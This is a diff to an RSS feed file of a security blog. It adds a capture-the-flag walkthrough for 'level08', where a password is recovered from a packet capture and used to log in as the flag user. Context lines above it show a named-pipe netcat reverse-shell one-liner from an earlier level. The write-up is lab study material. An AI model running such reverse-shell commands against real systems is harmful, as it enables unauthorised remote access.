@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 21 May 2016 22:00:30 +0800</pubDate>
-    <lastBuildDate>Sat, 21 May 2016 22:00:30 +0800</lastBuildDate>
+    <pubDate>Mon, 23 May 2016 22:35:27 +0800</pubDate>
+    <lastBuildDate>Mon, 23 May 2016 22:35:27 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
     
       <item>
@@ -318,6 +318,19 @@ link knowledge:
     for security,the linux system may not support -e parameter in netcat(nc -e ip port),so one way to exploit is:
         mknod /tmp/backpipe p
         /bin/bash 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;x08-level08&quot;&gt;0x08 level08&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
+    scp level08@192.168.2.140:/home/flag08/capture.pcap /root/Desktop/
+    wireshark to open /root/Desktop/capture.pcap
+    use wireshark,choose any tcp data,right click mouse,choose follow tcp stream
+    find password:...
+    use hex dump view to find 7f==&amp;gt;. is backspace
+    su - flag08
+    pass:backd00Rmate
+    getflag
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
